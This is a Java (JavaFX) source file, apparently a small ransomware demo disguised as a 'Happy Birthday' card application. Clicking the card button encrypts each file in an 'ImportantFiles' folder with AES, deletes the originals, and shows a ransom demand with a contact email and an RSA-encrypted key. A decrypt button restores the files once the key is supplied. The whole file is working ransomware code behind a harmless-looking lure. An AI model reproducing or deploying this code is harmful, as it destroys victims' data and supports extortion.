/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package javafxapplication3;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.util.Base64;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.application.Application;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.StackPane;
import javafx.scene.text.Font;
import javafx.stage.Stage;
import static javafxapplication3.RSAUtil.encrypt;
import static javafxapplication3.RSAUtil.publicKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Victim extends Application {

    @Override
    public void start(Stage primaryStage) throws IOException, InvalidKeyException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, NoSuchAlgorithmException, NoSuchAlgorithmException, NoSuchPaddingException, BadPaddingException, IllegalBlockSizeException {

        //Generate Random IV
        SecureRandom srandom = new SecureRandom();
        byte[] iv = new byte[128 / 8];
        srandom.nextBytes(iv);
        IvParameterSpec ivspec = new IvParameterSpec(iv);

        //Generate Random AES Key
        KeyGenerator kgen = KeyGenerator.getInstance("AES");
        SecretKey skey = kgen.generateKey();
        String encodedKey = Base64.getEncoder().encodeToString(skey.getEncoded());

        //RSA
        String encryptedString = Base64.getEncoder().encodeToString(encrypt(encodedKey, publicKey));

        //Create Cipher Object
        Cipher ci = Cipher.getInstance("AES/CBC/PKCS5Padding");
        ci.init(Cipher.ENCRYPT_MODE, skey, ivspec);

        File folder = new File("ImportantFiles");
        File[] files = folder.listFiles();

        //Image
        FileInputStream input = new FileInputStream("hb.jpg");
        Image image = new Image(input);
        ImageView imageView = new ImageView(image);
        imageView.setFitHeight(220);
        imageView.setFitWidth(700);
        imageView.setTranslateY(-150);
        //Button
        Button btn = new Button();
        Button btn2 = new Button();
        Button btn3 = new Button();
        Label label = new Label();
        TextField field = new TextField("Insert decrypted key for decryption");
        field.setVisible(false);
        btn2.setVisible(false);
        btn3.setVisible(false);
        label.setVisible(false);
        btn.setText("Send Happy Birthday Card To a Friend");
        btn2.setText("Decrypt Files");
        btn3.setText("Info");

        btn.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {

                field.setVisible(true);
                imageView.setVisible(false);
                btn.setVisible(false);
                btn2.setVisible(true);
                btn3.setVisible(true);
                label.setVisible(true);

                label.setText("All your files are now encrypted!");
                label.setFont(new Font(30.0));

                File[] files = folder.listFiles();
                try {
                    ci.init(Cipher.ENCRYPT_MODE, skey, ivspec);
                } catch (InvalidKeyException | InvalidAlgorithmParameterException ex) {
                    Logger.getLogger(Victim.class.getName()).log(Level.SEVERE, null, ex);
                }
                for (File file : files) {
                    try {
                        AESEnc.processFile(ci, file.getAbsolutePath(), file.getAbsolutePath() + "E");
                    } catch (IllegalBlockSizeException | BadPaddingException | IOException ex) {
                        Logger.getLogger(Victim.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    System.out.println(file.getName());
                    file.delete();
                }

                TextArea textArea = new TextArea("Email : Yazanmy1998@hotmail.com \n Encrypted Key: " + encryptedString);
                textArea.setEditable(false);
                textArea.setWrapText(true);
                GridPane gridPane = new GridPane();
                gridPane.setMaxWidth(Double.MAX_VALUE);
                gridPane.add(textArea, 0, 0);
                Alert alert = new Alert(AlertType.INFORMATION);
                alert.setTitle("Information");
                alert.setHeaderText("Send Ransom and Encrypted Key to the email for decryption");
                alert.getDialogPane().setContent(gridPane);
                alert.showAndWait();

            }
        });

        //Button Decrypt Files Actions
        btn2.setOnAction(new EventHandler<ActionEvent>() {

            @Override
            public void handle(ActionEvent event) {

                File[] files = folder.listFiles();
                byte[] decodedKey = Base64.getDecoder().decode(field.getText());
                SecretKey originalKey = new SecretKeySpec(decodedKey, 0, decodedKey.length, "AES");
                try {
                    ci.init(Cipher.DECRYPT_MODE, originalKey, ivspec);
                } catch (InvalidKeyException | InvalidAlgorithmParameterException ex) {
                    Logger.getLogger(Victim.class.getName()).log(Level.SEVERE, null, ex);
                    Alert alert = new Alert(AlertType.ERROR);
                    alert.setTitle("Error");
                    alert.setHeaderText("Your Key is too large");
                    alert.showAndWait();
                    return;
                }
                for (File file : files) {

                    try {
                        AESEnc.processFile(ci, file.getAbsolutePath(), file.getAbsolutePath().substring(0, file.getAbsolutePath().length() - 1));
                    } catch (IllegalBlockSizeException | BadPaddingException | IOException ex) {
                        Logger.getLogger(Victim.class.getName()).log(Level.SEVERE, null, ex);
                        Alert alert = new Alert(AlertType.ERROR);
                        alert.setTitle("Error");
                        alert.setHeaderText("Your Key is invaild");
                        alert.showAndWait();
                        return;    
                    }
                    System.out.println(file.getName());
                    file.delete();
                }
            }
        });

        //Info
        btn3.setOnAction(new EventHandler<ActionEvent>() {

            @Override
            public void handle(ActionEvent event) {

                TextArea textArea = new TextArea("Email : Yazanmy1998@hotmail.com \n Encrypted Key : " + encryptedString);
                textArea.setEditable(false);
                textArea.setWrapText(true);
                GridPane gridPane = new GridPane();
                gridPane.setMaxWidth(Double.MAX_VALUE);
                gridPane.add(textArea, 0, 0);
                Alert alert = new Alert(AlertType.INFORMATION);
                alert.setTitle("Information");
                alert.setHeaderText("Send Ransom and Encrypted Key to the email for decryption");
                alert.getDialogPane().setContent(gridPane);
                alert.showAndWait();

            }

        });

        StackPane root = new StackPane();
        root.getChildren().add(btn);
        root.getChildren().add(btn2);
        root.getChildren().add(btn3);
        root.getChildren().add(field);
        root.getChildren().add(imageView);
        root.getChildren().add(label);
        Scene scene = new Scene(root, 700, 500);
        label.setTranslateY(-125);
        btn3.setTranslateY(+50);
        field.setTranslateY(-75);
        primaryStage.setTitle("Happy Birthday!");
        primaryStage.setScene(scene);
        primaryStage.show();
    }

    public static void main(String[] args) {

        launch(args);
    }

}
